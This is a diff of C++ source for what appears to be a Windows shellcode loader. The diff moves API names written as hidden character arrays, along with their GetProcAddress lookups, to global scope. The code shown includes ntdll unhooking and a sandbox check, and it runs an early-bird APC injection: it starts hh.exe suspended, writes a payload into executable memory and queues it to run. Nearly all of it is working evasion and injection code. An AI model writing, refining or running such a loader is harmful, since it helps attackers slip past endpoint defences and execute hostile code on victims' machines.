@@ -17,12 +17,20 @@
 #pragma comment (lib, "Wininet.lib")
 
 typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+char aProcmemory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
+WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aProcmemory);
 
 typedef BOOL(WINAPI* QueueUserAPCFunc)(PAPCFUNC, HANDLE, ULONG_PTR);
+char aQueueUserAPC[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0'};
+QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aQueueUserAPC);
 
 typedef BOOL(WINAPI* CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+char aCreateProcess[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0'};
+CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aCreateProcess);
 
 typedef LPVOID(WINAPI* VirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+char aVirtualAllocEx[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', '\0'};
+VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualAllocEx);
 
 typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
 char aVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
@@ -72,8 +80,6 @@ BOOL CheckVirtualAllocExNuma(){
 }
 
 void unhookNtll(){
-
-
     HANDLE process = GetCurrentProcess();
 	MODULEINFO mi = {};
 	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
@@ -146,31 +152,27 @@ int main() {
 	STARTUPINFOA si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
 
-    char aCreateProcess[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0'};
-    CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aCreateProcess);
+
     pwCreateProcess("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 	
 
 	HANDLE victimProcess = pi.hProcess;
 	HANDLE threadHandle = pi.hThread;
 
-    char aVirtualAllocEx[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', '\0'};
-    VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualAllocEx);
+
     LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     PVOID pBaseAddress = nullptr;
     SIZE_T* bytesWritten = 0;
 
-    char aProcmemory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
-    WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aProcmemory);
+
     pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);
 
     pwVirtualProtect(shellAddress, payload.size(), PAGE_EXECUTE_READ, NULL);
 
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 
-    char aQueueUserAPC[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0'};
-    QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aQueueUserAPC);
+
     pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
     
     ResumeThread(threadHandle);
